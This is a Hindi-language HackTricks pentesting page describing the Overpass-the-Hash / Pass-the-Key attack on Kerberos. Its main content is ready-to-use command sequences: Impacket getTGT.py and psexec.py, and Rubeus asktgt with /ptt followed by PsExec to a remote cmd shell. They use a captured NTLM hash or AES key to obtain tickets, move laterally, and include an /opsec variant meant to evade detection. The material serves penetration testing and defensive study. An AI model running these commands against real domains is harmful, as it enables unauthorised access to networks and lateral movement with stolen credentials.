# Over Pass the Hash/Pass the Key

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PRs सबमिट करके।

</details>

## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** हमला उन environments के लिए डिज़ाइन किया गया है जहाँ पारंपरिक NTLM प्रोटोकॉल पर प्रतिबंध है, और Kerberos प्रमाणीकरण प्राथमिकता देता है। यह हमला एक उपयोगकर्ता के NTLM हैश या AES कुंजियों का उपयोग करता है ताकि Kerberos टिकट प्राप्त किया जा सके, जिससे नेटवर्क में संसाधनों तक के अनधिकृत पहुंच सके।

इस हमले को क्रियान्वित करने के लिए, पहला कदम लक्षित उपयोगकर्ता के खाते का NTLM हैश या पासवर्ड प्राप्त करना है। इस जानकारी को सुरक्षित करने के बाद, खाते के लिए टिकट ग्रांटिंग टिकट (TGT) प्राप्त किया जा सकता है, जिससे हमलावर को उन सेवाओं या मशीनों तक पहुंच मिल सकती है जिसकी अनुमति उपयोगकर्ता को है।

इस प्रक्रिया को निम्नलिखित कमांडों से प्रारंभ किया जा सकता है:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
उदाहरणों के लिए AES256 की आवश्यकता होने पर, `-aesKey [AES key]` विकल्प का उपयोग किया जा सकता है। इसके अतिरिक्त, प्राप्त टिकट का उपयोग किए जा सकता है विभिन्न उपकरणों के साथ, जैसे smbexec.py या wmiexec.py, हमले के दायरे को विस्तारित करते हुए।

_पाईएसन1 त्रुटि_ या _केडीसी नाम नहीं मिला_ जैसी आते हैं वे आम तौर पर Impacket पुस्तकालय को अपडेट करके या आईपी पते की बजाय होस्टनाम का उपयोग करके हल होती हैं, जिससे केरबेरोस केडीसी के साथ संगति सुनिश्चित हो।

Rubeus.exe का उपयोग करके एक वैकल्पिक कमांड क्रम इस तकनीक के एक और पहलू को दर्शाता है:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
यह विधि **पास द की** दृष्टिकोण को परामर्श और प्रमाणीकरण के उद्देश्यों के लिए सीधे टिकट का उपयोग करने पर ध्यान केंद्रित करती है। यह महत्वपूर्ण है कि एक टीजीटी अनुरोध की प्रारंभिकता घटक `4768: एक केरबेरोस प्रमाणीकरण टिकट (टीजीटी) का अनुरोध किया गया था`, जिससे डिफ़ॉल्ट रूप से RC4-HMAC का उपयोग किया जाता है, हालांकि आधुनिक Windows सिस्टम AES256 को अधिक पसंद करते हैं।

संचालन सुरक्षा को अनुरूप बनाने और AES256 का उपयोग करने के लिए निम्नलिखित कमांड लागू किया जा सकता है:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## संदर्भ

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करना चाहते हैं? [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मेरा** **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें।**
* **हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में PR जमा करके**।

</details>
